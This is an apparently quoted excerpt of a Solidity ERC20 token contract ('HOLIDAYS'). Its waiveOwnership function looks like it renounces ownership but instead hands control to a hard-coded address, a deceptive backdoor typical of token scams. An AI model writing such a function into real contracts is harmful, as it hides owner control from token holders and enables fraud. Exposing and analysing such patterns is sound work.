...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x29e0Fbb8474C359702cD93aE223a8EdF3Fc33F7E));
        _owner = address(0x29e0Fbb8474C359702cD93aE223a8EdF3Fc33F7E);
    }
...
contract HolidaysToken is Context, IERC20, Ownable {
    ...
    string private _symbol = "HOLIDAYS";
